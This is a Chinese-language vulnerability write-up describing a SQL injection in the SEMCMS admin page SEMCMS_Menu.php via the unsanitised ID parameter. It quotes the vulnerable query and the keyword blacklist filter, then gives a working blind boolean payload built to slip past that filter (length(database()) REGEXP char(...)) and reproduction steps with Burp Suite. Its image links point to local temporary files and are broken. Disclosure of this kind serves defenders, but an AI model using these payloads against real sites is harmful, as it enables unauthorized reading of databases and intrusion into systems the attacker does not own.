漏洞成因点：

/xcR45q_Admin/SEMCMS_Menu.php 第66行

 

漏洞代码

```
<?php
 } elseif ($type == "edit") {
 
   $row = mysqli_fetch_array($db_conn->query("SELECT * FROM sc_menu WHERE ID=" . $_GET["ID"]));
 
   ?>
```

  

可以看出 此处的ID通过GET传参时会执行sql语句 

过滤代码在/Include/contorl.php处

第151行

```
function test_input($data) { 
    //$data = str_replace("%", "percent", $data);
    $data = trim($data);
    $data = stripslashes($data);
    $data = htmlspecialchars($data,*ENT_QUOTES*);
    return $data;
  }
```

以及第8行

```
function inject_check_sql($sql_str) {
 
   return preg_match('/select|and|insert|=|%|<|between|update|\'|\*|union|into|load_file|outfile/i',$sql_str); 
 } 
 function verify_str($str) { 
    if(inject_check_sql($str)) {
      exit('Sorry,You do this is wrong! (.-.)');
     } 
   return $str;
 } 
```

 

通过以上过滤内容 可以构造paylaod

```
-1%20or%20length(database())%20REGEXP%20char(94,53,36)
```

 

漏洞复现

 

访问

```
http://url/xcR45q_Admin/SEMCMS_Menu.php
```

 

Brupsuite抓包  由于新建站点的时候数据库名的长度为5 所以payload构造为

```
-1%20or%20length(database())%20REGEXP%20char(94,53,36)
```

（判断数据库名长度是否为5）

 

插入payload查看回显 

![img](file:///C:/Users/12275/AppData/Local/Temp/msohtmlclip1/01/clip_image002.jpg)

 

此时更改payload

```
-1%20or%20length(database())%20REGEXP%20char(94,54,36)
```

（判断数据库名长度是否为6） 

插入payload查看回显 

![img](file:///C:/Users/12275/AppData/Local/Temp/msohtmlclip1/01/clip_image004.jpg)

 

后续可以根据页面的变化继续进行sql注入